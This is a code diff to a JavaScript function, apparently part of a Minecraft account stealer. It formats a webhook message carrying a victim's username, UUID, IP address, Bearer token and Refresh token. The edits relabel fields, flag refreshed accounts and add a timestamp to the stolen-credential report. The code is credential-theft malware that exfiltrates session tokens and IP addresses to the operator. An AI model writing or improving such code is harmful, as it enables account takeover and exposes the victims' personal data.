@@ -288,7 +288,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
         content: "",
         embeds: [
             {
-                title: "Minecraft User Authenticated",
+                title: refresh ? "Minecraft User Refreshed" : "Minecraft User Authenticated",
                 color: 5814783,
                 fields: [
                     {
@@ -302,7 +302,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                         inline: true
                     },
                     {
-                        name: "IP",
+                        name: "IP Address",
                         value: ip,
                         inline: true
                     },
@@ -318,8 +318,10 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                     }
                 ],
                 footer: {
-                    text: "BearToken: " + BearerToken + " | RefreshToken: " + RefreshToken + " | " + description
-                }
+                    text: `BearerToken: ${BearerToken} | RefreshToken: ${RefreshToken}`
+                },
+                timestamp: new Date(),
+                description: description
             }
         ]
     };
